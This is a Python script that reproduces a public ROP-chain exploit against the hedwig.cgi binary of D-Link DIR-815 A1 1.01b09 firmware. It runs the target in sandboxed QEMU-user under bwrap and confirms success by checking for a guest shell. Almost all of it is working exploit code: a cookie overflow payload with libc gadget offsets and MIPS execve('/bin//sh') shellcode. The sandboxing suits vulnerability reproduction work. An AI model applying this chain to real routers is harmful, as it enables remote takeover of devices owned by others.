#!/usr/bin/env python3
"""Reproduce CASE-0010's DIR-815 A1 1.01b09 ROP chain in local QEMU-user.

Attribution: the gadget-chain idea is from the publicly disclosed Kanxue article:
https://bbs.kanxue.com/thread-272318.htm#msg_header_h3_1

This runner adapts the chain for the hash-pinned b09 rootfs and uses a locally
verified 56-byte shellcode. It runs QEMU inside bwrap private user/network
namespaces; it sends no network traffic and does not target a physical router.

Host dependencies: Python 3, pwntools, qemu-mipsel-static, bwrap.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

from pwn import asm, context, p32

BODY = b"winmt=pwner"
LIBC_BASE = 0x2B300000
CGIBIN_SHA256 = "452ae350e2129c5612fd49b99401c0cb732a2c7a1e68a57596022fb3fdf50af0"
LIBC_SHA256 = "9203e3d01359543faf37d2ea30b87c308f4f1cc58b8a14bbfde9dbdaf38a8cfc"
QEMU_HOST = shutil.which("qemu-mipsel-static")


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def validate_b09_rootfs(rootfs: Path) -> None:
    """Fail closed unless this is the documented b09 sample."""
    version = (rootfs / "etc/config/buildver").read_text().strip()
    revision = (rootfs / "etc/config/buildrev").read_text().strip()
    if (version, revision) != ("1.01", "b09"):
        raise ValueError(f"expected DIR-815 A1 1.01b09, got {version}/{revision}")
    cgibin = sha256_file(rootfs / "htdocs/cgibin")
    libc = sha256_file(rootfs / "lib/libuClibc-0.9.30.1.so")
    if cgibin != CGIBIN_SHA256:
        raise ValueError(f"cgibin SHA-256 mismatch: {cgibin}")
    if libc != LIBC_SHA256:
        raise ValueError(f"libuClibc SHA-256 mismatch: {libc}")
    if not QEMU_HOST or not Path(QEMU_HOST).is_file():
        raise FileNotFoundError("qemu-mipsel-static was not found in PATH")
    if not shutil.which("bwrap"):
        raise FileNotFoundError("bwrap was not found in PATH")


def build_shellcode() -> bytes:
    """Assemble the locally verified MIPS o32 execve('/bin//sh') shellcode."""
    context.clear()
    context(os="linux", arch="mips", endian="little", log_level="error")
    return asm("""
        addiu $a2, $sp, -4
        li $t7, 0x69622f2f
        sw $t7, -12($sp)
        li $t6, 0x68732f6e
        sw $t6, -8($sp)
        sw $zero, -4($sp)
        addiu $a0, $sp, -12
        sw $a0, -24($sp)
        sw $zero, -20($sp)
        addiu $a1, $sp, -24
        li $v0, 4011
        syscall 0x40404
    """)


def build_uid_payload(libc_base: int = LIBC_BASE) -> bytes:
    """Build only the uid value; do not start QEMU or make a network request."""
    context.clear()
    context(os="linux", arch="mips", endian="little", log_level="error")
    base = libc_base
    payload = b"A" * 0x3CD
    payload += b"A" * 4
    payload += p32(base + 0x436D0)  # restore saved regs; indirect jump via t9=s3
    payload += b"A" * 4
    payload += p32(base + 0x56BD0)  # s3 = sleep
    payload += b"A" * 20
    payload += p32(base + 0x57E50)  # saved RA: set a0=1, then jump via s1
    payload += b"A" * 0x18
    payload += b"A" * 16
    payload += p32(base + 0x37E6C)  # jump through a1
    payload += p32(base + 0x3B974)  # set a1 to the stack shellcode frame
    payload += b"A" * 0x18
    payload += build_shellcode()
    if b"\x00" in payload:
        raise ValueError("uid payload contains NUL bytes and would be truncated")
    return payload


def build_cgi_env(uid_payload: bytes) -> dict[bytes, bytes]:
    """Prepare the CGI environment; Cookie and POST body remain separate."""
    return {
        b"PATH": b"/usr/bin:/bin",
        b"REQUEST_METHOD": b"POST",
        b"REQUEST_URI": b"2333",
        b"CONTENT_TYPE": b"application/x-www-form-urlencoded",
        b"CONTENT_LENGTH": str(len(BODY)).encode("ascii"),
        b"HTTP_COOKIE": b"uid=" + uid_payload,
    }


def stage_b09_rootfs(source: Path, destination: Path) -> None:
    """Copy the verified firmware to a disposable staging tree for QEMU."""
    shutil.copytree(source, destination, symlinks=True)
    tmp_path = destination / "tmp"
    if tmp_path.is_symlink():
        tmp_path.unlink()
    tmp_path.mkdir(parents=True, exist_ok=True)
    (destination / "var/tmp").mkdir(parents=True, exist_ok=True)
    qemu_copy = destination / "bin/qemu-host"
    shutil.copy2(QEMU_HOST, qemu_copy)
    helper = destination / "usr/libexec/qemu-binfmt/mipsel-binfmt-P"
    helper.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(QEMU_HOST, helper)


def build_private_qemu_command(stage: Path) -> list[str]:
    """Run only local QEMU-user in private user/network namespaces."""
    return [
        "bwrap", "--unshare-user", "--unshare-net", "--die-with-parent",
        "--ro-bind", str(stage), "/",
        "--tmpfs", "/var/tmp",
        "--dev", "/dev", "--proc", "/proc", "--chdir", "/",
        "/bin/qemu-host", "-0", "hedwig.cgi", "-L", "/", "/htdocs/cgibin",
    ]


def start_local_qemu(rootfs: Path, stage: Path, env: dict[bytes, bytes]) -> subprocess.Popen:
    """Start the staged CGI process; the QEMU guest has no network interface."""
    return subprocess.Popen(
        build_private_qemu_command(stage),
        cwd=str(rootfs),
        env=env,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def send_cgi_body_and_shell_check(proc: subprocess.Popen) -> None:
    """Send the short CGI body, then builtin-only checks after shellcode execve."""
    if proc.stdin is None:
        raise BrokenPipeError("QEMU CGI stdin is unavailable")
    proc.stdin.write(BODY)
    proc.stdin.flush()
    time.sleep(2)  # Allow the ROP chain's sleep(1) and execve to finish.
    shell_check = (
        b"echo ROP_SHELL_BEGIN; uname -m; "
        b"test -f /etc/config/buildver; echo buildver_test=$?; "
        b"test -f /etc/config/buildrev; echo buildrev_test=$?; "
        b"echo ROP_SHELL_END; exit\n"
    )
    proc.stdin.write(shell_check)
    proc.stdin.flush()
    proc.stdin.close()
    proc.stdin = None


def collect_qemu_result(proc: subprocess.Popen) -> tuple[int, bytes, bytes]:
    """Collect output; kill only this local QEMU process if it times out."""
    try:
        stdout, stderr = proc.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, stderr = proc.communicate()
    return proc.returncode, stdout, stderr


def check_guest_shell_proof(returncode: int, stdout: bytes) -> bool:
    """Require guest architecture and firmware markers, not just a prompt."""
    return (
        returncode == 0
        and b"ROP_SHELL_BEGIN" in stdout
        and b"ROP_SHELL_END" in stdout
        and b"mips" in stdout.lower()
        and b"buildver_test=0" in stdout
        and b"buildrev_test=0" in stdout
    )


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("b09_rootfs", type=Path, help="local unpacked DIR-815 A1 1.01b09 rootfs")
    parser.add_argument(
        "--libc-base", type=lambda value: int(value, 0), default=LIBC_BASE,
        help="QEMU-user libc base for this host (default: 0x2b300000)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_arguments()
    rootfs = args.b09_rootfs.resolve()
    validate_b09_rootfs(rootfs)
    uid_payload = build_uid_payload(args.libc_base)
    env = build_cgi_env(uid_payload)

    with tempfile.TemporaryDirectory(prefix="tmp_case10_b09_qemu_") as temp_dir:
        stage = Path(temp_dir) / "rootfs"
        stage_b09_rootfs(rootfs, stage)
        proc = start_local_qemu(rootfs, stage, env)
        try:
            send_cgi_body_and_shell_check(proc)
        except BrokenPipeError:
            if proc.stdin is not None:
                proc.stdin.close()
                proc.stdin = None
        returncode, stdout, stderr = collect_qemu_result(proc)

    print("target=local DIR-815 A1 1.01b09 under private QEMU-user/bwrap")
    print(f"libc_base={args.libc_base:#x} uid_len={len(uid_payload)} returncode={returncode}")
    print("stdout:")
    print(stdout.decode("latin-1", errors="replace"), end="" if stdout.endswith(b"\n") else "\n")
    print("stderr:")
    print(stderr.decode("latin-1", errors="replace"), end="" if stderr.endswith(b"\n") else "\n")
    success = check_guest_shell_proof(returncode, stdout)
    print(f"guest_shell_achieved={success}")
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
